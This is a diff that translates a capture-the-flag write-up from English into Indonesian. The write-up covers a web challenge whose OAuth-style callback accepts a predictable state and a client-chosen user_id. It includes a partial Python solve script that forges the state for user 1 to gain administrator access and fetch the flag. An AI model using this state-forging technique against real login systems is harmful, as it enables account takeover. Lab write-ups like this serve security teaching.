@@ -2,13 +2,13 @@
 
 | | |
 |---|---|
-| **Section** | wave 8 |
-| **Category** | web |
-| **Solves** | 62 |
+| **Bagian** | wave 8 |
+| **Kategori** | web |
+| **Jumlah Solve** | 62 |
 
-## Overview
+## Ikhtisar
 
-The Bureau of Trust implements an OAuth-style login. A development copy of the state handler is exposed at `/source.py.bak`, and the callback trusts a client-supplied `user_id`. The relevant implementation is:
+Bureau of Trust menerapkan login bergaya OAuth. Salinan pengembangan pengendali status diekspos di `/source.py.bak`, dan panggilan balik memercayai `user_id` yang disediakan klien. Implementasi yang relevan adalah:
 
 ```python
 def make_state(user_id: int) -> str:
@@ -26,11 +26,11 @@ def verify_state_for(user_id: int, submitted_state: str,
     return False
 ```
 
-The state is therefore predictable, and `verify_state_for` is the only callback check. There is no server-side binding between the state and the browser session.
+Oleh karena itu, statusnya dapat diprediksi, dan `verify_state_for` adalah satu-satunya pemeriksaan panggilan balik. Tidak ada pengikatan sisi server antara status dan sesi browser.
 
-## Solve
+## Penyelesaian
 
-The lobby only links to guest, auditor, and treasurer, but the callback accepts any `user_id`. The administrator account is `user_id=1`. After exchanging the team token for a session, generate the state for the current timestamp and for user 1, then hit the callback directly:
+Lobi hanya tertaut ke tamu, auditor, dan bendahara, tetapi panggilan balik menerima `user_id` apa pun. Akun administratornya adalah `user_id=1`. Setelah menukar token tim untuk suatu sesi, buat status untuk stempel waktu saat ini dan untuk pengguna 1, lalu langsung tekan callback:
 
 ```python
 import hashlib, time, requests
@@ -43,4 +43,4 @@ s.get("https://state-of-trust.pointeroverflowctf.com/auth/callback"
 print(s.get("https://state-of-trust.pointeroverflowctf.com/flag").text)
 ```
 
-The callback stores `sot_user_id=1`, so the session is now the administrator. The `/admin` dashboard exposes the Trust Seal button, which calls `/flag` and returns the flag. The accepted flag was `████████████████`.
+Callback menyimpan `sot_user_id=1`, sehingga sesi tersebut sekarang menjadi administrator. Dasbor `/admin` memperlihatkan tombol Trust Seal, yang memanggil `/flag` dan mengembalikan bendera. Flag yang diterima adalah `████████████████`.
